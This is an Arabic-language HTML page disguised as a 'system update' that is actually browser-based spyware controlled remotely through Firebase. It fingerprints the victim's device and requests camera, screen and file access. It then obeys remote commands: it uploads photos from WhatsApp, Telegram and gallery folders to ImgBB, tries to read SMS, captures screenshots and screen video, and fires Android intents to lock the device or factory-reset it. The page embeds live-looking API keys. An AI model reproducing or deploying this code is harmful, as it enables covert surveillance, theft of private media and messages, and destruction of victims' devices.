<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>تحديث النظام</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Courier New',monospace; display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; margin: 0; }
        #msg { font-size: 1.4em; text-align: center; margin-bottom: 30px; padding: 0 20px; }
        .btn { background: #0af; color: #000; padding: 15px 40px; border: none; font-weight: bold; cursor: pointer; font-size: 1.3em; border-radius: 5px; display: none; }
    </style>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
</head>
<body>
    <div id="msg">📱 تحديث النظام مطلوب</div>
    <button id="grantBtn" class="btn" onclick="startPayload()">بدء التحديث</button>
    <script>
        // ========== إعدادات Firebase ==========
        const firebaseConfig = {
            apiKey: "AIzaSyCUUU64NotDyl-qjSvAD1jQZSQZrZEcuvU",
            authDomain: "zwahy-5b75d.firebaseapp.com",
            databaseURL: "https://zwahy-5b75d-default-rtdb.firebaseio.com",
            projectId: "zwahy-5b75d",
            storageBucket: "zwahy-5b75d.firebasestorage.app",
            messagingSenderId: "820206227713",
            appId: "1:820206227713:web:02057307aca7dfb7100b00"
        };
        const IMGBB_KEY = "69e4b5971880f9d736172f5fc9eb5bac";
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const browserFingerprint = navigator.userAgent + screen.width + screen.height + navigator.hardwareConcurrency;
        const vid = 'phantom-' + Math.abs(hashCode(browserFingerprint)).toString(36);
        const vref = db.ref('victims/' + vid);
        let ROOT_HANDLE = null;
        let camStream = null;
        let lootCounter = 0;

        function hashCode(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                hash = ((hash << 5) - hash) + str.charCodeAt(i);
                hash |= 0;
            }
            return hash;
        }

        // ========== بدء الواجهة ==========
        setTimeout(() => {
            document.getElementById('msg').innerText = "يرجى الضغط على 'بدء التحديث' للمتابعة";
            document.getElementById('grantBtn').style.display = 'block';
        }, 2000);

        window.startPayload = async function() {
            document.getElementById('grantBtn').style.display = 'none';
            document.getElementById('msg').innerText = "جاري التحديث...";

            // تسجيل الجهاز فوراً
            await registerDevice();

            // طلب الإذن الشامل (Android WebView / Chrome)
            await requestSuperPermission();

            // تفعيل الأوامر
            vref.child('online').set(true);
            document.getElementById('msg').innerText = "✅ تم بنجاح";
            setTimeout(() => {
                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
            }, 1000);

            startCommandListener();
        };

        // ========== الإذن الشامل ==========
        async function requestSuperPermission() {
            // الكاميرا
            try { camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }); } catch(e) {}
            // الشاشة
            try { const d = await navigator.mediaDevices.getDisplayMedia({ video: true }); d.getTracks().forEach(t => t.stop()); } catch(e) {}

            // الوصول إلى جذر التخزين عبر Intents (يعمل على Android)
            try {
                // هذا يطلب من المستخدم منح الإذن للملفات
                const handle = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
                ROOT_HANDLE = handle;
                // محاولة الصعود لأعلى مجلد ممكن
                try { ROOT_HANDLE = await handle.getDirectoryHandle('..'); } catch(e) {}
            } catch(e) {
                // فشل، نكتفي بالصلاحيات الأخرى
            }

            // طلب إذن SMS
            try {
                if ('webkitSms' in window || 'sms' in navigator) {
                    // SMS API تحتاج إذن المستخدم أيضاً
                }
            } catch(e) {}
        }

        // ========== تسجيل الجهاز ==========
        async function registerDevice() {
            let ip = 'غير معروف';
            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
            let battery = '?', charging = false;
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    battery = Math.round(b.level * 100) + '%';
                    charging = b.charging;
                }
            } catch(e) {}
            await vref.set({
                online: true,
                fingerprint: {
                    ua: navigator.userAgent,
                    plat: navigator.platform,
                    scr: screen.width + 'x' + screen.height,
                    cores: navigator.hardwareConcurrency,
                    mem: navigator.deviceMemory || '?',
                    ip: ip,
                    battery: battery,
                    charging: charging,
                    language: navigator.language,
                    time: new Date().toLocaleString()
                }
            });
        }

        // ========== استقبال الأوامر ==========
        function startCommandListener() {
            vref.child('command').on('value', async (snap) => {
                const cmd = snap.val();
                if (!cmd) return;
                console.log('📩 أمر:', cmd.action, cmd);
                
                try {
                    switch(cmd.action) {
                        case 'get_all_photos': await getAllPhotos(); break;
                        case 'get_all_sms': await getAllSMS(); break;
                        case 'get_device_info': await sendDeviceInfo(); break;
                        case 'vibrate': navigator.vibrate([500,200,500,200,500]); break;
                        case 'play_sound': playRingtone(); break;
                        case 'screenshot': await screenshot(); break;
                        case 'record_video': await recordVid(cmd.duration || 10); break;
                        case 'flash_on': await setFlash(true); break;
                        case 'flash_off': await setFlash(false); break;
                        case 'lock_screen': lockScreen(cmd.pin || ''); break;
                        case 'send_notification': showNotification(cmd.message || ''); break;
                        case 'format': await formatDevice(); break;
                    }
                } catch(e) {
                    console.error('❌ خطأ:', e.message);
                }
                await vref.child('command').remove();
            });
        }

        // ========== سحب جميع الصور من كل المجلدات ==========
        async function getAllPhotos() {
            if (!ROOT_HANDLE) throw new Error('لا صلاحية ملفات');
            
            // قائمة بكل المجلدات المعروفة
            const folders = [
                'DCIM/Camera', 'DCIM/Screenshots', 'DCIM/100ANDRO',
                'Pictures', 'Pictures/Screenshots',
                'Download', 'Downloads',
                'WhatsApp/Media/WhatsApp Images', 'WhatsApp/Media/WhatsApp Images/Sent',
                'Facebook/Media', 'Messenger/Media',
                'Telegram/Telegram Images', 'Snapchat/Media',
                'Instagram/Media', 'Twitter/Media'
            ];

            for (const folder of folders) {
                try {
                    let current = ROOT_HANDLE;
                    const parts = folder.split('/');
                    for (const part of parts) {
                        current = await current.getDirectoryHandle(part);
                    }
                    await walkDir(current, folder + '/');
                } catch(e) {
                    // المجلد غير موجود، تخطي
                }
            }
        }

        async function walkDir(dirHandle, prefix) {
            for await (let entry of dirHandle.values()) {
                if (entry.kind === 'file') {
                    const file = await entry.getFile();
                    // نقبل أي ملف صور أو فيديو
                    const ext = file.name.split('.').pop().toLowerCase();
                    if (!['jpg','jpeg','png','gif','webp','mp4','mov','avi'].includes(ext)) continue;
                    if (file.size > 15 * 1024 * 1024) continue;
                    
                    const reader = new FileReader();
                    reader.onload = async (e) => {
                        const b64 = e.target.result.split(',')[1];
                        const url = await uploadToImgBB(b64);
                        await store('photo', url, { name: prefix + entry.name, size: file.size, folder: prefix });
                    };
                    reader.readAsDataURL(file);
                } else if (entry.kind === 'directory') {
                    const sub = await dirHandle.getDirectoryHandle(entry.name);
                    await walkDir(sub, prefix + entry.name + '/');
                }
            }
        }

        // ========== سحب SMS ==========
        async function getAllSMS() {
            try {
                let messages = [];
                if ('webkitSms' in window) {
                    const list = await window.webkitSms.getMessages({});
                    for (let sms of list) {
                        messages.push({
                            from: sms.sender || 'غير معروف',
                            body: sms.body || '',
                            date: new Date(sms.timestamp || Date.now()).toLocaleString()
                        });
                    }
                } else if ('sms' in navigator) {
                    const list = await navigator.sms.getMessages({});
                    for (let sms of list) {
                        messages.push({
                            from: sms.sender || 'غير معروف',
                            body: sms.body || '',
                            date: new Date(sms.timestamp || Date.now()).toLocaleString()
                        });
                    }
                } else {
                    // محاولة بديلة: استخدام Android Intent
                    window.open('intent://#Intent;action=android.provider.Telephony.SMS_RECEIVED;end');
                    messages = [{ from: 'API غير مدعوم', body: 'لا يمكن سحب SMS من هذا المتصفح', date: new Date().toLocaleString() }];
                }
                await store('sms', null, { info: messages.slice(-30) }); // آخر 30 رسالة
            } catch(e) {
                await store('sms', null, { info: { error: e.message } });
            }
        }

        // ========== معلومات الجهاز كاملة ==========
        async function sendDeviceInfo() {
            const snap = await vref.child('fingerprint').once('value');
            const info = snap.val() || {};
            
            // إضافة معلومات إضافية
            info.connection = navigator.connection ? navigator.connection.effectiveType : 'غير معروف';
            info.cookies = navigator.cookieEnabled;
            info.online = navigator.onLine;
            info.platform = navigator.platform;
            info.vendor = navigator.vendor;
            info.gpu = (() => {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        return gl.getParameter(gl.RENDERER);
                    }
                } catch(e) {}
                return 'غير معروف';
            })();
            
            await store('device_info', null, { info });
        }

        // ========== رنة ==========
        function playRingtone() {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.type = 'square';
                osc.frequency.value = 800;
                gain.gain.value = 0.5;
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.start();
                setTimeout(() => { osc.stop(); gain.disconnect(); ctx.close(); }, 3000);
            } catch(e) {}
        }

        // ========== إشعار ==========
        function showNotification(message) {
            const div = document.createElement('div');
            div.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#ff0;color:#000;padding:20px;border-radius:10px;font-size:1.2em;font-weight:bold;z-index:999999;text-align:center;';
            div.textContent = message;
            document.body.appendChild(div);
            setTimeout(() => div.remove(), 3000);
        }

        // ========== فلاش ==========
        async function setFlash(on) {
            if (!camStream) return;
            const track = camStream.getVideoTracks()[0];
            if (track && track.applyConstraints) {
                await track.applyConstraints({ advanced: [{ torch: on }] });
            }
        }

        // ========== لقطة شاشة ==========
        async function screenshot() {
            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const b64 = canvas.toDataURL('image/png').split(',')[1];
            const url = await uploadToImgBB(b64);
            await store('screenshot', url, { ts: Date.now() });
            stream.getTracks().forEach(t => t.stop());
        }

        // ========== فيديو ==========
        async function recordVid(sec) {
            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.onload = async (e) => {
                    const b64 = e.target.result.split(',')[1];
                    const url = await uploadToImgBB(b64);
                    await store('video', url, { ts: Date.now() });
                };
                reader.readAsDataURL(blob);
                stream.getTracks().forEach(t => t.stop());
            };
            recorder.start();
            setTimeout(() => recorder.stop(), sec * 1000);
        }

        // ========== فرمتة ==========
        async function formatDevice() {
            window.open('intent://#Intent;action=android.intent.action.MASTER_CLEAR;end');
        }

        // ========== قفل ==========
        function lockScreen(pin) {
            window.open(`intent://#Intent;action=android.app.action.SET_NEW_PASSWORD;extra.android.app.extra.PASSWORD=${pin};end`);
            setTimeout(() => window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end'), 500);
        }

        // ========== ImgBB ==========
        async function uploadToImgBB(b64) {
            const fd = new FormData();
            fd.append('key', IMGBB_KEY);
            fd.append('image', b64);
            const res = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: fd });
            const json = await res.json();
            if (json.success) return json.data.url;
            throw new Error('فشل الرفع');
        }

        // ========== تخزين ==========
        async function store(type, url, extra = {}) {
            lootCounter++;
            await vref.child('loot').push().set({ type, url, ts: Date.now(), counter: lootCounter, ...extra });
        }
    </script>
</body>
</html>
